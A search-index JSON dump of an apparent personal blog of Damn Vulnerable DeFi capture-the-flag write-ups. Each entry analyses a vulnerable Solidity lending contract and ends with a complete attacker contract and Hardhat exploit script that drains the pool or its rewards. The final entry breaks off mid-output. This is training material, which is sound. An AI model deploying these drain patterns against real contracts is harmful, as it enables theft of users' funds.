{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"About meeeeh","text":"<p>Heya! I'm an amateur pentester interested in smart contract security. This is a journal of my smart contract security audits walkthrough for various boxes! My walkthrough are based on trial and error with limited knowledge. Cheers! </p> <p>Disclaimer: Do not use any of the codes in actual production</p>"},{"location":"#numen-ctf-2023-write-up-updating","title":"Numen CTF 2023 Write up (Updating)","text":"<p>Source code:  https://github.com/numencyber/NumenCTF_2023</p> <p>Counter</p> <p>Exist</p> <p>Lenderpool</p> <p>Wallet</p>"},{"location":"#damn-vulnerable-defi-2022-write-up","title":"Damn Vulnerable DeFi 2022 Write up","text":"<p>Unstoppable</p> <p>Naive-Receiver</p> <p>Truster</p> <p>Side-Entrance</p> <p>The-Rewarder</p> <p>Selfie</p> <p>[[Compromised]]</p> <p>[[Puppet]]</p> <p>[[Puppet-v2]]</p> <p>[[Free-rider]]</p>"},{"location":"Damn%20Vulnerable%20DeFi/Naive-Receiver/","title":"Naive-Receiver","text":""},{"location":"Damn%20Vulnerable%20DeFi/Naive-Receiver/#introduction","title":"Introduction","text":"<p>The goal is to drain the user tokens. In this section, flash loan from NaiveReceiverLenderPool.sol impose a fixed interest rate of 1 ether (Holy jesus). Therefore, 1 token will be extracted from the user for every flash loan.</p>"},{"location":"Damn%20Vulnerable%20DeFi/Naive-Receiver/#code-breakdown","title":"Code Breakdown","text":"<p>Let's start by breaking down the source code into functions. There are two files - FlashLoanReceiver.sol and NaiveReceiverLenderPool.sol. Similiar to the previous challenge, NaiveReceiverLenderPool.sol will execute function from FlashLoanReceiver.sol during a flashloan.</p> <p>Let's look at NaiveReceiverLenderPool.sol primarily. Two types of variables are declared at the start - Address and FIXED_FEE.</p> <pre><code>using Address for address;\nuint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan\n</code></pre> <p>The primary function of the smart contract have several items to look at</p> <pre><code>function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {\n\n    //goal to drain user's contract funds\n\n    uint256 balanceBefore = address(this).balance; \n    require(balanceBefore &gt;= borrowAmount, \"Not enough ETH in pool\"); \n\n    require(borrower.isContract(), \"Borrower must be a deployed contract\"); //can only be called from a different contract\n    // Transfer ETH and handle control to receiver\n    borrower.functionCallWithValue(\n        abi.encodeWithSignature(\n            \"receiveEther(uint256)\",\n            FIXED_FEE\n        ),\n        borrowAmount\n    );\n\n    require(\n        address(this).balance &gt;= balanceBefore + FIXED_FEE,\n        \"Flash loan hasn't been paid back\"\n    );\n}\n</code></pre> <p>Unlike the previous challenge, only 1 pool exist now. balanceBefore is a variable that stores the current number of ethers in the pool prior to a flash loan. It must be more or equal to borrowAmount. <code>require(balanceBefore &gt;= borrowAmount, \"Not enough ETH in pool\");</code> </p> <p>Next, borrower must be a deployed contract rather than a user. <code>require(borrower.isContract(), \"Borrower must be a deployed contract\");</code></p> <p>Next, it will execute receiverEther(uint256) function from FlashLoanReceiver.sol.</p> <pre><code>// Transfer ETH and handle control to receiver\nborrower.functionCallWithValue(\n    abi.encodeWithSignature(\n        \"receiveEther(uint256)\",\n        FIXED_FEE\n    ),\n    borrowAmount\n);\n</code></pre> <p>After executing the function from FlashLoanReceiver.sol, it will check if the borrowed amount is payed along with the fixed fee.</p> <pre><code>require(\n    address(this).balance &gt;= balanceBefore + FIXED_FEE,\n    \"Flash loan hasn't been paid back\"\n);\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Naive-Receiver/#hints","title":"Hints","text":"<p>This function does not check if the msg.sender is indeed the borrower.</p> <pre><code>function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant\n</code></pre> <p>Thus, an attacker can insert any valid address and initiate a flash loan causing the victim to pay the fixed fee.</p>"},{"location":"Damn%20Vulnerable%20DeFi/Naive-Receiver/#solution","title":"Solution","text":"<p>The solution is to siphon tokens away from a legitimate user by putting in their address for a flash loan. By doing so, the smart contract will charge the legitimate user a fixed fee of 1 ETH per flash loan till they run out. This is the easy solution.</p> <pre><code>it('Exploit', async function () {\n    /** CODE YOUR EXPLOIT HERE */   \n    while (true){\n        await this.pool.flashLoan(this.receiver.address, 0);\n        value = String(await ethers.provider.getBalance(this.receiver.address));\n        console.log(value);\n        if (value == \"0\"){\n            break;\n        }\n    }\n});\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Naive-Receiver/#recommendations","title":"Recommendations","text":"<p>Always check if the sender is the borrower. A simple require statement can be implemented at the start of the flash loan <code>require(msg.sender == borrower);</code></p>"},{"location":"Damn%20Vulnerable%20DeFi/Selfie/","title":"Selfie","text":""},{"location":"Damn%20Vulnerable%20DeFi/Selfie/#introduction","title":"Introduction","text":"<p>A flash pool with a simple governance in place.</p>"},{"location":"Damn%20Vulnerable%20DeFi/Selfie/#code-breakdown","title":"Code Breakdown","text":"<p>Let's start by breaking down SelfiePool.sol. It uses openzeppelin for ERC20 and address while is uses an inhouse governance. Basic event, modifier and constructor were created. Looking at the first function flashLoan, it offers basic flash loan services we've seen so far. It has re-entrancy protections and checks if the sender is from another contract. It'll then perform a low-level call with receiveTokens(addres,uint256). After performing the low-level call, it'll check if the tokens are returned.</p> <pre><code>function flashLoan(uint256 borrowAmount) external nonReentrant {\n    uint256 balanceBefore = token.balanceOf(address(this));\n    require(balanceBefore &gt;= borrowAmount, \"Not enough tokens in pool\");\n\n    token.transfer(msg.sender, borrowAmount);        \n\n    require(msg.sender.isContract(), \"Sender must be a deployed contract\");\n    msg.sender.functionCall(\n        abi.encodeWithSignature(\n            \"receiveTokens(address,uint256)\",\n            address(token),\n            borrowAmount\n        )\n    );\n\n    uint256 balanceAfter = token.balanceOf(address(this));\n\n    require(balanceAfter &gt;= balanceBefore, \"Flash loan hasn't been paid back\");\n}\n</code></pre> <p>Next function, drainAllFunds have an onlyGovernance modifier which will transfer all tokens to the receiver and emits an event afterwards.</p> <pre><code>function drainAllFunds(address receiver) external onlyGovernance {\n    uint256 amount = token.balanceOf(address(this));\n    token.transfer(receiver, amount);\n\n    emit FundsDrained(receiver, amount);\n}\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Selfie/#hints","title":"Hints","text":"<p>We know that flashLoan execute a low-level call, thus we can manipulate the call to execute an action with SimpleGovernance.sol</p> <p>In SimpleGovernance.sol, there are 2 functions - queueAction and executeAction. Notice that each action in governance have a timeframe, once the timeframe expires, it'll be due for execution.</p> <pre><code>function _canBeExecuted(uint256 actionId) private view returns (bool) {\n    GovernanceAction memory actionToExecute = actions[actionId];\n    return (\n        actionToExecute.executedAt == 0 &amp;&amp;\n        (block.timestamp - actionToExecute.proposedAt &gt;= ACTION_DELAY_IN_SECONDS)\n    );\n}\n</code></pre> <p>What we want to do is simple: 1) Create an attacker smart contract with the function receiveTokens(address, uint256) to match the low-level call from SelfiePool.sol. 2) In the function receiveTokens(address, uint256), it'll have to call queueAction to enqueue drainAllFunds. 3) Return the tokens borrowed 4) Fast forward time 5) Execute the drainAllFunds with executeAction</p>"},{"location":"Damn%20Vulnerable%20DeFi/Selfie/#solutions","title":"Solutions","text":"<p>Here's the attacker smart contract.</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\";\nimport \"../DamnValuableTokenSnapshot.sol\";\nimport \"./SimpleGovernance.sol\";\nimport \"../selfie/SelfiePool.sol\";\n\n/**\n * @title Attacker\n * @author BingleBangle-BH\n */\ncontract Attacker {\n\n    SimpleGovernance public immutable governance;\n    SelfiePool public immutable _SelfiePool;\n    uint256 public _ActionId;\n\n    constructor(address _SelfiePoolAddress, address _governanceAddress) {\n        governance = SimpleGovernance(_governanceAddress);\n        _SelfiePool = SelfiePool(_SelfiePoolAddress);\n    }\n\n    function receiveTokens(DamnValuableTokenSnapshot token, uint256 _borrowamount) public {\n        bytes memory data = abi.encodeWithSignature(\n                                \"drainAllFunds(address)\",\n                                tx.origin\n                            );\n\n        token.snapshot(); //Required before queueing action\n\n        token.transfer(msg.sender, _borrowamount);\n\n        _ActionId = governance.queueAction(address(_SelfiePool), data, 0);\n    }\n\n    function stealFunds(uint256 _amount) public {\n        _SelfiePool.flashLoan(_amount);\n    }\n}\n</code></pre> <p>Here's the javascript</p> <pre><code>it('Exploit', async function () {\n    /** CODE YOUR EXPLOIT HERE */\n    const _Attacker = await ethers.getContractFactory('Attacker', attacker);\n\n    this._AttackerPool = await _Attacker.deploy(this.pool.address, this.governance.address);\n    await this._AttackerPool.stealFunds(TOKENS_IN_POOL);\n    await ethers.provider.send(\"evm_increaseTime\", [2 * 24 * 60 * 60]);\n    await this.governance.executeAction(await this._AttackerPool._ActionId());\n});\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Side-Entrance/","title":"Side-Entrance","text":""},{"location":"Damn%20Vulnerable%20DeFi/Side-Entrance/#introduction","title":"Introduction","text":"<p>The goal of this box is to siphon 1000ETHs in an existing lending pool.</p>"},{"location":"Damn%20Vulnerable%20DeFi/Side-Entrance/#code-breakdown","title":"Code Breakdown","text":"<p>Similiar to Truster box, it only has 1 smart contract SideEntranceLenderPool.sol. Let's start by looking at the variables.</p> <pre><code>using Address for address payable;\nmapping (address =&gt; uint256) private balances;\n</code></pre> <p>The address variable uses openzeppelin library to offer more functions. Reference: https://docs.openzeppelin.com/contracts/3.x/api/utils#Address</p> <p>Whereas, a simple hashmap is made for balances where each address contains x amount of tokens in integer format. Reference: https://medium.com/upstate-interactive/mappings-in-solidity-explained-in-under-two-minutes-ecba88aff96e</p> <p>The first function is an interface. It is empty and it contains an execute() function.</p> <pre><code>interface IFlashLoanEtherReceiver {\n    function execute() external payable;\n}\n</code></pre> <p>The next function is desposit. It is simple where it stores the value directly into the hashmap.</p> <pre><code>function deposit() external payable {\n    balances[msg.sender] += msg.value;\n}\n</code></pre> <p>Next, a withdraw() function is created for users to withdraw their tokens out to their wallet. Even though it does not have any reentrancy guard, it follows the best practice outlined by Solidity documentation - Checks-Effect-Interactions Pattern.</p> <pre><code>function withdraw() external {\n    uint256 amountToWithdraw = balances[msg.sender];\n    balances[msg.sender] = 0;\n    payable(msg.sender).sendValue(amountToWithdraw);\n}\n</code></pre> <p>Lastly, flashLoan(uin256 amount) function is created.  As usual, it checks if the pool have sufficient ETH for borrowing.</p> <pre><code>uint256 balanceBefore = address(this).balance;\nrequire(balanceBefore &gt;= amount, \"Not enough ETH in balance\");\n</code></pre> <p>Next, it executes an interface function .</p> <pre><code>IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();\n</code></pre> <p>Lastly, it checks if the loan is returned to the lending pool.</p> <pre><code>require(address(this).balance &gt;= balanceBefore, \"Flash loan hasn't been paid back\");        \n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Side-Entrance/#hints","title":"Hints","text":"<p>First and foremost, there are two pool of funds - lending pool and individual balance pool. Both are identified based on their address. Here's the problem, the lending pool and individual balance pool have overlaps. </p> <p>Consider this scenario: A lending pool has an address. Since it's an address, it have an individual lending balance pool too. Let's assign 10 ETH to the lending pool. Notice that the individual Balance pool is 0.</p> Lending Pool Lending Individual Balance Attacker Balance Pool Attacler Balance 10 ETH 0 ETH 0 ETH 0 ETH <p>This essentially means <code>address(this).balance != balances(address(this))</code>. Here's the loophole, if we deposit 10 ETH to the Lending Individual Balance, the Lending Pool will still reflect 10 ETH as the ETH was not transferred away from the Lending Pool. However, the function will add 10 ETH into the hashmap which will increase Lending Individual Balance by 10 ETH. Thus, both Lending Pool and Lending Individual Balance will have 10 ETHs respectively. </p> <pre><code>function deposit() external payable {\n    balances[msg.sender] += msg.value;\n}\n</code></pre> <p>Understanding this concept, we can also bypass the final check in the flashLoan function as address(this).balance refers to Lending Pool.</p> <pre><code>require(address(this).balance &gt;= balanceBefore, \"Flash loan hasn't been paid back\");        \n</code></pre> <p>The result after flashLoan should look like this.</p> Lending Pool Lending Individual Balance Attacker Balance Pool Attacker Balance 10 ETH 10 ETH 0 ETH 0 ETH <p>Next, we'll withdraw ETHs with the function withdraw(). The function will remove all ETHs from Lending Individual Balance and transfer ETHs from Lending Pool to msg.sender. msg.sender should be coming from Attacker Balance Pool. Note: You may be thinking, Address.sol requires 2 parameters for the function sendValue yet I only see 1. This should clarify any doubts. <code>payable(msg.sender).sendValue(amountToWithdraw);</code> is the same as <code>Address.sendValue(payable(msg.sender), amountToWithdraw);</code></p> <pre><code>function withdraw() external {\n    uint256 amountToWithdraw = balances[msg.sender];\n    balances[msg.sender] = 0;\n    payable(msg.sender).sendValue(amountToWithdraw);\n}\n</code></pre> <p>Using that function should result in this.</p> Lending Pool Lending Individual Balance Attacker Balance Pool Attacker Balance 0 ETH 0 ETH 10 ETH 0 ETH <p>Now, we'll shift the 10 ETHs from Attacker Balance Pool to Attacker Balance with a simple transaction which will yield the final result.</p> Lending Pool Lending Individual Balance Attacker Balance Pool Attacker Balance 0 ETH 0 ETH 0 ETH 10 ETH"},{"location":"Damn%20Vulnerable%20DeFi/Side-Entrance/#solutions","title":"Solutions","text":"<p>Following the hints above, your smart contract should look similar to this.</p> <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"../side-entrance/SideEntranceLenderPool.sol\";\n\n/**\n * @title SideEntranceAttacker\n * @author BingleBangle-BH's attacker contract\n */\n\n contract SideEntranceAttacker{\n    using Address for address payable;\n    SideEntranceLenderPool public immutable pool;\n\n    constructor (SideEntranceLenderPool _pool){\n        pool = SideEntranceLenderPool(_pool);\n    }\n\n    function execute() public payable{\n        pool.deposit{value: msg.value}();\n    }\n\n    function stealFunds() external{\n        pool.flashLoan(address(pool).balance);\n        pool.withdraw();\n        address _owner = msg.sender;\n        payable(_owner).sendValue(address(this).balance);\n    }\n\n    receive () external payable {}\n }\n</code></pre> <p>Here's the javascript</p> <pre><code>it('Exploit', async function () {\n    /** CODE YOUR EXPLOIT HERE */\n    const SideEntranceAttack = await ethers.getContractFactory('SideEntranceAttacker', attacker);\n    this.attackpool = await SideEntranceAttack.deploy(this.pool.address);\n    await this.attackpool.stealFunds();\n});\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Side-Entrance/#recommendations","title":"Recommendations","text":"<p>Do not use allow two pools of funds to exist in a single smart contract. Use openzeppelin libraries such asERC20 to manage the funds.</p>"},{"location":"Damn%20Vulnerable%20DeFi/The-Rewarder/","title":"The-Rewarder","text":""},{"location":"Damn%20Vulnerable%20DeFi/The-Rewarder/#introduction","title":"Introduction","text":"<p>The goal of this box is to get rewards out of the rewarder pool without depositing a single token.</p>"},{"location":"Damn%20Vulnerable%20DeFi/The-Rewarder/#code-breakdown","title":"Code Breakdown","text":"<p>To do so, we'll have to look at the following contracts</p> <p>FlashLoanerPool.sol.</p> <p>Let's start by looking at the important functions.</p> <p>function flashLoan(uint256 amount) external nonRentrant</p> <p>Like any other flash loan function, it requires the sender to be a contract and the contract must have a function receiveFlashLoan(uint256)</p> <p>Why does your attacker contract requires receiveFlashLoan (uint256)? In the flashLoan function, it calls for it explicity.</p> <pre><code>msg.sender.functionCall(\n    abi.encodeWithSignature(\n        \"receiveFlashLoan(uint256)\",\n        amount\n    )\n);\n</code></pre> <p>The next contract we'll be looking at is TheRewarderPool.sol</p> <p>Let's start by looking at the important functions.</p> <p>function deposit(uint256 amountToDeposit) external</p> <p>This is a simple function where users will deposit their tokens. It'll call for a distributeRewards() whenever a deposit is made to check if it's time for reward distribution.</p> <p>function withdraw(uint256 amountToWithdraw) external</p> <p>This is a function where user can withdraw their token</p> <p>function distributeRewards() public returns (uint256)</p> <p>This function will check for distribute the reward evenly among the depositers according to contributions.</p> <p>function isNewRewardsRound() public view returns (bool)</p> <p>To check if a new round is issued every 5 days.</p>"},{"location":"Damn%20Vulnerable%20DeFi/The-Rewarder/#hints","title":"Hints","text":"<p>There are 2 variables to consider - Ensure new round has started, Flashloan, deposit and steal rewards under the same contract.</p> <p>Here's the thought process when you're crafting the attacker contract</p> <p>1) Send a command to the block to fast forward time by 5 days 2) Flashloan the tokens, deposit them, withdraw and return the tokens within the same function. 3) Transfer the reward tokens to the attacker address</p>"},{"location":"Damn%20Vulnerable%20DeFi/The-Rewarder/#solutions","title":"Solutions","text":"<p>Following the hints above, your smart contract should look similar to this.</p> <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../the-rewarder/TheRewarderPool.sol\";\nimport \"../the-rewarder/FlashLoanerPool.sol\";\nimport \"../DamnValuableToken.sol\";\nimport \"./RewardToken.sol\";\nimport \"./AccountingToken.sol\";\n\n/**\n * @title Attacker\n * @author BingleBangle-BH\n */\n\n contract Attacker {\n\n    using Address for address payable;\n\n    address payable private pool;\n\n    FlashLoanerPool public flash_pool;\n    TheRewarderPool public reward_pool;\n    RewardToken public reward_token;\n    DamnValuableToken public liquidity_token;\n\n    constructor(address _flash_pool, address _reward_pool, address _reward_token, address _tokenAddress) {\n        flash_pool = FlashLoanerPool(_flash_pool);\n        reward_pool = TheRewarderPool(_reward_pool);\n        reward_token = RewardToken(_reward_token);\n        liquidity_token = DamnValuableToken(_tokenAddress);\n    }\n\n    function receiveFlashLoan(uint256 amount) public payable {\n        liquidity_token.approve(address(reward_pool), amount);\n        reward_pool.deposit(amount);\n        reward_pool.withdraw(amount);\n        liquidity_token.transfer(address(flash_pool), amount);\n    }\n\n    function stealRewards() external{\n        uint256 dvtPoolBalance = liquidity_token.balanceOf(address(flash_pool));\n        flash_pool.flashLoan(dvtPoolBalance);\n        reward_token.transfer(msg.sender, reward_token.balanceOf(address(this)));\n    }\n\n }\n</code></pre> <p>Here's the javascript</p> <pre><code>it('Exploit', async function () {\n    /** CODE YOUR EXPLOIT HERE */\n\n    // Advance time 5 days so that depositors can get rewards\n    await ethers.provider.send(\"evm_increaseTime\", [5 * 24 * 60 * 60]); \n\n    //Deploy attacker contract\n    const attacker_pool = await ethers.getContractFactory('Attacker', attacker);\n    this.attack = await attacker_pool.deploy(this.flashLoanPool.address, \n                                        this.rewarderPool.address,\n                                        this.rewardToken.address, \n                                        this.liquidityToken.address);\n    await this.attack.stealRewards();\n\n    balance = await this.rewardToken.balanceOf(attacker.address);\n    console.log(balance.toString());\n});\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/The-Rewarder/#recommendations","title":"Recommendations","text":"<p>Do not use block.timestamp or block.number as an indicator to manage the number of rounds or time in your contract. Consider using external oracle service that provides time information such as Chainlink, TimezoneDB or WorldClockAPI.</p>"},{"location":"Damn%20Vulnerable%20DeFi/Truster/","title":"Truster","text":""},{"location":"Damn%20Vulnerable%20DeFi/Truster/#introduction","title":"Introduction","text":"<p>The goal is to siphon all the funds from a pool in a single transaction.</p>"},{"location":"Damn%20Vulnerable%20DeFi/Truster/#code-breakdown","title":"Code Breakdown","text":"<p>There is only 1 smart contract and consist of 1 function flashLoan. Let's start by looking at the variable.</p> <pre><code>using Address for address;\nIERC20 public immutable damnValuableToken;\n</code></pre> <p>Both variables are using openzepplin libraries. Links given below showcase the function available to each cast. Reference: https://docs.openzeppelin.com/contracts/3.x/api/utils#Address</p> <p>https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20</p> <p>Next, an IERC20 token address is called during the constructor</p> <pre><code>constructor (address tokenAddress) {\n    damnValuableToken = IERC20(tokenAddress);\n}\n</code></pre> <p>Lastly, the flashLoan function requires 4 variables.</p> <pre><code>function flashLoan(\n    uint256 borrowAmount,\n    address borrower,\n    address target,\n    bytes calldata data\n)\n</code></pre> <p>It checks if the amount of token in the pool is more than borrow amount</p> <pre><code>uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); \nrequire(balanceBefore &gt;= borrowAmount, \"Not enough tokens in pool\"); \n</code></pre> <p>After the check, it'll transfer the token to the borrower and execute a low level call</p> <pre><code>damnValuableToken.transfer(borrower, borrowAmount); //transfer to borrower\ntarget.functionCall(data);\n</code></pre> <p>Finally, it will check if the flash loan is returned to the pool</p> <pre><code>uint256 balanceAfter = damnValuableToken.balanceOf(address(this));\nrequire(balanceAfter &gt;= balanceBefore, \"Flash loan hasn't been paid back\");\n</code></pre> <p>Since there are Reentrancy Guard employued in the contract and function, it is not plausible for a reentrancy attack. A direct transfer of token is not an option as well. Let's look at the target.functionCall(data) Reference: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol</p> <p>Notice that it calls for <code>return functionCallWithValue(target, data, 0, \"Address: low-level call failed!\");</code>.</p> <p>Tracing that, we'll arrive at this function. Now we can find a way to call a function within the flashloan.</p> <pre><code>require(address(this).balance &gt;= value, \"Address: insufficient balance for call\");\n(bool success, bytes memory returndata) = target.call{value: value}(data);\nreturn verifyCallResultFromTarget(target, success, returndata, errorMessage);\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Truster/#hints","title":"Hints","text":"<p>We can call a low level approval that allow the attacker to transfer funds on the behalf of this contract. Here's the flow: 1) Execute flashloan 2) Within the flashloan, target.functionCall(data); will execute an approval for attacker to transfer token on the contract's behalf in the future 3) Return the flashloan and complete the function 4) Transfer the tokens on behalf of the contract</p> <p>Here are reference links to read up Reference: https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-approve-address-uint256-</p> <p>https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-</p>"},{"location":"Damn%20Vulnerable%20DeFi/Truster/#solution","title":"Solution","text":"<p>Here's an easy solution. We want to execute a low-level call to authorise our attacker address to transfer tokens in the future. Here's the statement to obtain the call data.</p> <pre><code>bytes memory attackcalldata = abi.encodeWithSignature(\n    \"approve(address,uint256)\",\n    address(this),\n    tokens\n);\n</code></pre> <p>Then, we'll drop the call data into the flashLoan function when it'll execute the approve call.</p> <pre><code>pool.flashLoan(0, msg.sender, address(damnValuableToken), attackcalldata);\n</code></pre> <p>Lastly, the attacker is now an authorised user to transfer token on behalf of the smart contract pool.</p> <pre><code>damnValuableToken.transferFrom(address(pool), msg.sender, tokens);\n</code></pre> <p>A new smart contract is drawn up for this solution. Here's the codes.</p> <pre><code>// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"../truster/TrusterLenderPool.sol\";\n\n/**\n * @title TrusterAttacker\n * @author BingleBangle-BH's attacker contract\n */\ncontract TrusterAttacker is ReentrancyGuard {\n\n    IERC20 public immutable damnValuableToken;\n    TrusterLenderPool public immutable pool;\n\n    constructor (address _pool, address _token){\n        pool = TrusterLenderPool(_pool);\n        damnValuableToken = IERC20(_token);\n    }\n\n    function drainFunds(uint256 tokens) external nonReentrant{\n        bytes memory attackcalldata = abi.encodeWithSignature(\n            \"approve(address,uint256)\",\n            address(this),\n            tokens\n        );\n        pool.flashLoan(0, msg.sender, address(damnValuableToken), attackcalldata);\n        damnValuableToken.transferFrom(address(pool), msg.sender, tokens);\n\n    }\n}\n</code></pre> <p>Here's the call from javascript</p> <pre><code>it('Exploit', async function () {\n    /** CODE YOUR EXPLOIT HERE  */\n    const attackerpool = await ethers.getContractFactory('TrusterAttacker', attacker);\n    this.attack = await attackerpool.deploy(this.pool.address, this.token.address);\n    await this.attack.connect(attacker).drainFunds(TOKENS_IN_POOL);\n});\n</code></pre>"},{"location":"Damn%20Vulnerable%20DeFi/Truster/#recommendations","title":"Recommendations","text":"<p>Do not allow unidentified users to insert calldata. If need be, always check <code>msg.sender</code> against a list of whitelisted address.</p>"},{"location":"Damn%20Vulnerable%20DeFi/Unstoppable/","title":"Unstoppable","text":""},{"location":"Damn%20Vulnerable%20DeFi/Unstoppable/#introduction","title":"Introduction","text":"<p>The goal is stop pool from offering flash loan. How does flash loan works? In simple terms, flash loan are broken down into 3 steps and to be completed in a single transaction. 1) A loan from a pool of money is sent to receiver. 2) Receiver will use the money to execute a certain action from another smart contract. 3) Receiver will return the money with fixed rate (Something like an interest rate).</p> <p>Reference: https://10clouds.com/blog/defi/understanding-flash-loans-in-defi/</p>"},{"location":"Damn%20Vulnerable%20DeFi/Unstoppable/#code-breakdown","title":"Code Breakdown","text":"<p>Let's start by breaking down the source code into functions. There are two files - UnstoppableLender.sol and ReceiverUnstoppable.sol. UnstoppableLender.sol will loan money to receiver and execute functions from ReceiverUnstoppable.sol.</p> <p>However, we'll look at UnstoppableLender.sol primarily.</p> <p>There are a few variables declared, one consutructors and two functions in the smart contract.</p> <p>For starters, this contract mainly use damnValuableToken as their main currency - <code>IERC20 public immutable damnValuableToken</code>. Openzeppelin is used to create the token.</p> <p>Reference: https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20</p> <p><code>uint256 public poolBalance</code> is created to store a pool token ready to be loaned. </p> <p>Next, a constructor is called whenever the smart contract is deployed. Next, the tokens will be named as damnValuableToken.</p> <pre><code>constructor(address tokenAddress) {\n    require(tokenAddress != address(0), \"Token address cannot be zero\");\n    damnValuableToken = IERC20(tokenAddress);\n}\n</code></pre> <p>It requires tokenAddress and it performs a check if the address is 0. This will ensure the address integrity.</p> <p>Now, we can talk about the functions in question. Let's start with depositTokens.</p> <pre><code>function depositTokens(uint256 amount) external nonReentrant {\n    require(amount &gt; 0, \"Must deposit at least one token\");\n    // Transfer token from sender. Sender must have first approved them.\n    damnValuableToken.transferFrom(msg.sender, address(this), amount);\n    poolBalance = poolBalance + amount;\n}\n</code></pre> <p>The functions require amount to be specified and more than 0 when it's called. As part of an innate function from openzeppelin IERC20 , <code>damnValuableToken.transferFrom(msg.sender, address(this), amount);</code> will then transfer <code>amount</code> to <code>address(this)</code> from <code>msg.sender</code>. <code>msg.sender</code> = sender address (deployer). <code>address(this)</code> = receiver address (pool smart contract address). <code>amount</code> = amount of tokens deposited to pool.</p> <p>poolBalance will be updated along with the new amount. Note that this is the only place where poolBalance can be updated.</p> <p>Next, flashLoan is the main function to execute a flash loan.</p> <pre><code>function flashLoan(uint256 borrowAmount) external nonReentrant {\n    require(borrowAmount &gt; 0, \"Must borrow at least one token\");\n\n    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));\n    require(balanceBefore &gt;= borrowAmount, \"Not enough tokens in pool\");\n\n    // Ensured by the protocol via the `depositTokens` function\n    assert(poolBalance == balanceBefore);\n\n    damnValuableToken.transfer(msg.sender, borrowAmount);\n\n    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);\n\n    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));\n    require(balanceAfter &gt;= balanceBefore, \"Flash loan hasn't been paid back\");\n}\n</code></pre> <p>I'll breakdown a few requirements quickly. <code>require(borrowAmount &gt; 0, \"Must borrow at least one token\");</code> = Amount borrowed must be more than 1 token. <code>require(balanceBefore &gt;= borrowAmount, \"Not enough tokens in pool\");</code> = Current amount of tokens in the pool must be more than amount borrowed. <code>assert(poolBalance == balanceBefore);</code> = Current amount of tokens in poolBalance must be the same before the flashloan. <code>damnValuableToken.transfer(msg.sender, borrowAmount);</code> = Token transferred to receiver. <code>IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);</code> = Execute function in another contract ReceiverUnstoppable.sol. </p> <p>During this function, tokens loaned to receiver will be returned to pool. <code>require(balanceAfter &gt;= balanceBefore, \"Flash loan hasn't been paid back\");</code> = Amount of tokens after loaned must be more than the amount of tokens before the loan</p>"},{"location":"Damn%20Vulnerable%20DeFi/Unstoppable/#hints","title":"Hints","text":"<p>The goal is to stop the smart contract from functioning.  Take a look at this section <code>assert(poolBalance == balanceBefore);</code>.</p> <p>Technically, there exist 2 pool balance - 1 in UnstoppableLender.sol* and DamnValuableToken.sol**.</p> <p>Notice that poolBalance must be equal to balanceBefore. These are the 2 pool balance poolBalance can only be increased from the function depositTokens. balanceBefore checks for the current tokens in the pool directly from DamnValuableToken.sol (openzeppelin innate function).  Therefore, both variables are async. A simple solution is to transfer token directly into DamnValuableToken.sol to trigger a revert in <code>assert(poolBalance == balanceBefore);</code>.</p>"},{"location":"Damn%20Vulnerable%20DeFi/Unstoppable/#solution","title":"Solution","text":"<p>Here's the solution (I've added 2 functions in ReceiverUnstoppable.sol to retrieve the number of tokens in the pool).</p> <pre><code>it('Exploit', async function () {\n    /** CODE YOUR EXPLOIT HERE */\n    //Before Transfer\n    before_bal1 = await this.pool.getPoolBal();\n    before_bal2 = await this.pool.getTokenBal();\n    console.log(\"Before transfer:\\nBalance from ReceiverUnstoppable.sol - \", before_bal1.toString());\n    console.log(\"Balance from DamnValuableToken.sol - \", before_bal2.toString());\n\n    //Transfer token to halt flashloan services\n    console.log(\"Transferring 1 token to DamnValuableToken.sol pool\");\n    await this.token.transfer(this.pool.address, 1);\n\n    //After Transfer\n    after_bal1 = await this.pool.getPoolBal();\n    after_bal2 = await this.pool.getTokenBal();\n    console.log(\"After transfer:\\nBalance from ReceiverUnstoppable.sol - \", after_bal1.toString());\n    console.log(\"Balance from DamnValuableToken.sol - \", after_bal2.toString());\n});\n</code></pre> <p>Functions added to reflect the result below</p> <pre><code>function getPoolBal() public view returns (uint256){\n    return poolBalance;\n}\n\nfunction getTokenBal() public view returns (uint256){\n    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));\n    return balanceBefore;\n}\n</code></pre> <p>Here's the result </p> <pre><code>Before transfer:\nBalance from ReceiverUnstoppable.sol -  1000000000000000000000000\nBalance from DamnValuableToken.sol -  1000000000000000000000000\nTransferring 1 token to 